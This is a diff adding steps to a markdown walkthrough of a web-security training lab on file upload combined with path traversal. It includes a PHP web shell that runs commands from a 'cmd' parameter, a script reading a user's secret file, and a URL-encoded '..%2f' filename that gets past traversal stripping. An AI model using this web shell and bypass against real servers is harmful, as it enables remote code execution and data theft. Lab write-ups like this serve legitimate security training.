@@ -197,4 +197,60 @@ Web servers often use the `filename` field in `multipart/form-data` requests to 
 You should also note that even though you may send all of your requests to the same domain name, this often points to a reverse proxy server of some kind, such as a load balancer. Your requests will often be handled by additional servers behind the scenes, which may also be configured differently. 
 
 --- 
-> To be continue.......... 
+
+## Process
+
+1. Log in and upload an image as your avatar, then go back to your account page.
+2. In Burp, go to `Proxy > HTTP` history and notice that your image was fetched using a `GET` request to `/files/avatars/<YOUR-IMAGE>`. Send this request to Burp Repeater or caido replay.
+3.  On your system, create a file called exploit.php, containing a script for fetching the contents of Carlos's secret. For example:
+   ```PHP
+i. <?php echo file_get_contents('/home/carlos/secret'); ?>
+    or
+ii. <?php system($_GET['cmd']);?>
+```
+4. Upload this script as your avatar. Notice that the website doesn't seem to prevent you from uploading PHP files.
+<h2>AFTER UPLOAD</h2>
+<img width="1606" height="963" alt="Screenshot_20260118_124927" src="https://github.com/user-attachments/assets/238a90d3-0b0f-463b-9129-46156baf9c27" />
+
+5. In Burp Repeater or caido replay, go to the tab containing the `GET /files/avatars/<YOUR-IMAGE>` request. In the path, replace the name of your image file with `exploit.php` and send the request. Observe that instead of executing the script and returning the output, the server has just returned the contents of the PHP file as plain text.
+6. In Burp's or caido's proxy history, find the `POST /my-account/avatar` request that was used to submit the file upload and send it to Burp Repeater or caido replay.
+<h2>PROXY HISTORY</h2>
+<img width="1920" height="1046" alt="Screenshot_20260118_131456" src="https://github.com/user-attachments/assets/60d56709-011b-4a84-b31f-6bf8fa59efb7" />
+
+7. In Burp Repeater or caido replay, go to the tab containing the `POST /my-account/avatar` request and find the part of the request body that relates to your PHP file. In the Content-Disposition header, change the filename to include a directory traversal sequence:
+    ```WEB
+    Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
+    ```
+8. Send the request. Notice that the response says The `file avatars/exploit.php` has been uploaded. This suggests that the server is stripping the directory traversal sequence from the file name.
+<h2>BEFORE PATHTRIVARSAL</h2>
+    <img width="1531" height="974" alt="Screenshot_20260118_125257" src="https://github.com/user-attachments/assets/aa0c64f5-dae2-4aff-8616-43770a2fde8f" />
+
+9. Obfuscate the directory traversal sequence by URL encoding the forward slash (`/`) character, resulting in:
+```WEB
+   filename="..%2fexploit.php" or "%2e%2e%2fexploit.php".
+```
+<h2>AFTER PATHTRIVARSAL</h2>
+<img width="1530" height="992" alt="Screenshot_20260118_125225" src="https://github.com/user-attachments/assets/284d9bcd-20ee-4a15-9bac-dad29ab03312" />
+
+<h2>OPEN IMAGE TO NEW TAB</h2>
+<img width="1636" height="1049" alt="Screenshot_20260118_125006" src="https://github.com/user-attachments/assets/f4b0fa9d-9f7f-4c12-924b-fee316dc2cdb" />
+
+<h2>FOR 2ND EXPLOIT</h2>
+<img width="872" height="375" alt="Screenshot_20260118_125052" src="https://github.com/user-attachments/assets/4645de0d-cc51-478c-85a9-d74205fc0deb" />
+
+- Just remove the `/avatars/..%2f` that file will now ready to go.....
+
+<h2>NOW CMD PLAY COMES IN</h2>
+<img width="1751" height="460" alt="Screenshot_20260118_125149" src="https://github.com/user-attachments/assets/0bdb3066-1743-4f51-bfbc-dd2dfd906344" />
+
+- Now just add `?cmd=<command>` you are just exploited the website using path-trivarsal & file upload vuln....
+
+10. Send the request and observe that the message now says The `file avatars/../exploit.php` has been uploaded. This indicates that the file name is being URL decoded by the server. In the browser, go back to your account page.
+11. In Burp's or caido's proxy history, find the `GET /files/avatars/..%2fexploit.php` request. Observe that Carlos's secret was returned in the response or you can retrive by 2nd exploit by executing own commands on webpage. This indicates that the file was uploaded to a higher directory in the filesystem hierarchy (`/files`), and subsequently executed by the server. Note that this means you can also request this file using `GET /files/exploit.php`.
+
+<img width="1022" height="300" alt="Screenshot_20260118_124840" src="https://github.com/user-attachments/assets/3b19d156-5245-490c-b6be-28eea308c4df" />
+
+12. Submit the secret to solve the lab.
+
+---
+> TO BE CONTINUEE.............
